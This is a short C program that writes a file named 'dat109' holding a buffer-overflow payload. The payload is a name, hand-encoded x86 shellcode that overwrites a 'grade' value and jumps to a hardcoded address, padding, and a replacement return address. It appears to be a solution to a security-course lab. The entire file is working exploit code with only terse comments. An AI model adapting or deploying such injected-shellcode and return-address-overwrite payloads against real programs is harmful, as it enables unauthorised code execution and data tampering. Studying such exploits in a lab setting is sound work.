#include <stdio.h>
#include <stdlib.h>

int main(){
	int i=0;
	FILE *fp=fopen("dat109","w");
	if(fp==NULL) exit(EXIT_FAILURE);

	fprintf(fp,"Nasia");
	fputc('\0',fp);/*6*/
	
	/*movb 9,addr of grade*/
	fputc(0xc6,fp);
	fputc(0x05,fp);
	
	fputc(0x68,fp);
	fputc(0x30,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);
	
	fputc(0x61,fp);
	/*movb 9,addr of grade*/
	fputc(0xc6,fp);
	fputc(0x05,fp);
	/*location of c*/	
	fputc(0x61,fp);
	fputc(0x20,fp);
	fputc(0x0b,fp);
	fputc(0x08,fp);
	/*d in hex is 64*/
	fputc(0x64,fp);

	/*movl addr, eax*/
	fputc(0xb8,fp);
	fputc(0x95,fp);
	fputc(0x9e,fp);
	fputc(0x04,fp);
	fputc(0x08,fp);
	/*jmp eax*/
	fputc(0xff,fp);
	fputc(0xe0,fp);
	
	for(i=0;i<14;i++){
		fputc('\0',fp);
	}

	fputc(50,fp);

	/*return address will be at buff + 6 chars(my name) as thats where the code starts
	 * so at Name[6]=0x80e42dc+6(hex)=0x80e42e2*/
	fputc(0xe2,fp);
	fputc(0x42,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);

	/*Name*/
	fputc(0xdc,fp);
	fputc(0x42,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);

	fclose(fp);

	return 0;
}
